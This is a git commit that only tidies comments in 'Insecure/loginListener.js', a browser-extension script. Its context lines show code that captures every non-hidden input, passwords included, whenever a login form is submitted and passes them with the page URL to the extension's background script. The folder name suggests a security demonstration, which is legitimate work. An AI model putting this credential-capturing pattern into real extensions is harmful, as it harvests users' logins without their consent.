544b05bd1df4431d7e5f180723c78637c229c91c
Nicholas Shaw <35937378+nishaw303@users.noreply.github.com>
2018-11-22 18:31:12 -0500

    Fixed comments

--- Insecure/loginListener.js
+++ Insecure/loginListener.js
@@ -2,12 +2,14 @@
 document.querySelectorAll('input[type="password"]').forEach( function(password_field) {
     // Listen for when form is submitted, and send the event to a function
     password_field.form.addEventListener("submit", function(e) {
-        // Take the event and find the target (the form), find all inputs not of type "hidden" or "submit", and turn the output into an array
+        /* 
+        Take the event and find the target (the form), find all inputs not of type "hidden" or "submit", 
+        and turn the output into an array
+        */
         var inputs = Array.prototype.slice.call(e.target.querySelectorAll('input:not([type="hidden"]):not([type="submit"])'));
         // Turn array of inputs into an array of their values (the strings they contain)
         inputs.forEach( function(input, i, arr) { arr[i] = input.value; });
-        // Send a message to background script in the form "url + joined array of inputs"
+        // Send a message to background script in the form "url, input: input"
         chrome.runtime.sendMessage({loginListener: location.href + ", " + inputs.join(": ")});
     }, false);
 });
-
